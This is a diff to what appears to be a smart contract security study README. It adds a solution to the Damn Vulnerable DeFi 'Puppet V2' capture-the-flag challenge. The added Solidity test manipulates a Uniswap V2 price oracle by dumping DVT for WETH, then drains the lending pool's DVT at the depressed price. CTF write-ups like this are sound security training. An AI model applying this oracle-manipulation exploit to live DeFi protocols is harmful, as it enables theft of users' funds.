@@ -41,7 +41,8 @@
   - [Governance Attack](#governance-attack)
 - [Challenges solved](#challenges-solved)
   - [Damn Vulnerable DeFi v4](#damn-vulnerable-defi-v4)
-    - [Selfie](#selfie) 
+    - [Selfie](#selfie)
+    - [Puppet V2](#puppet-v2)
   - [Cyfrin CodeHawks First Flights](#cyfrin-codeHawks-first-flights)
     - [First Flight #14: AirDropper H-02. Lack of a claim verification mechanism in the function `MerkleAirdrop::claim` results in the USDC protocol balance draining](#first-flight-14-airdropper-h-02-lack-of-a-claim-verification-mechanism-in-the-function-merkleairdropclaim-results-in-the-usdc-protocol-balance-draining)
     - [First Flight #13: Baba Marta H-01. No restriction implemented in `MartenitsaToken::updateCountMartenitsaTokensOwner` allows any user to update any MartenitsaToken balance breaking the operativity and purpose of the protocol](#first-flight-13-baba-marta-h-01-no-restriction-implemented-in-martenitsatokenupdatecountmartenitsatokensowner-allows-any-user-to-update-any-martenitsatoken-balance-breaking-the-operativity-and-purpose-of-the-protocol)
@@ -1041,6 +1042,68 @@ contract SelfieAttacker is IERC3156FlashBorrower {
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
+```
+
+</details>
+
+#### Puppet V2
+
+**Summary**
+
+It is possible to manipulate the price of the DVT token by exchanging a large amount of it for WETH on the Uniswap exchange of the DVT/WETH pair.
+
+<details>
+
+<summary>Solution</summary>
+
+```Solidity
+    function test_puppetV2() public checkSolvedByPlayer {
+        console.log(
+            "Initial WETH needed to swap all DVT: ",
+            lendingPool.calculateDepositOfWETHRequired(
+                token.balanceOf(address(lendingPool)) / 10 ** 18
+            )
+        );
+
+        address[] memory path;
+        path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        // Step 1. swap DVT for WETH to decrease the price of DVT
+        token.approve(address(uniswapV2Router), token.balanceOf(player));
+        uniswapV2Router.swapExactTokensForTokens(
+            token.balanceOf(player),
+            0,
+            path,
+            address(player),
+            block.timestamp + 1 days
+        );
+
+        console.log(
+            "New amount of WETH needed to swap all DVT: ",
+            lendingPool.calculateDepositOfWETHRequired(
+                token.balanceOf(address(lendingPool)) / 10 ** 18
+            )
+        );
+
+        // Step 2. get the remaining WETH needed for the swap
+        weth.deposit{
+            value: lendingPool.calculateDepositOfWETHRequired(
+                token.balanceOf(address(lendingPool))
+            ) - weth.balanceOf(player)
+        }();
+
+        // Step 3. use the WETH to borrow the DVT tokens
+        uint256 wethNeeded = lendingPool.calculateDepositOfWETHRequired(
+            token.balanceOf(address(lendingPool))
+        );
+        weth.approve(address(lendingPool), wethNeeded);
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+
+        // Step 4. send the DVT to the recovery account
+        token.transfer(address(recovery), token.balanceOf(player));
+    }
 ```
 
 </details>
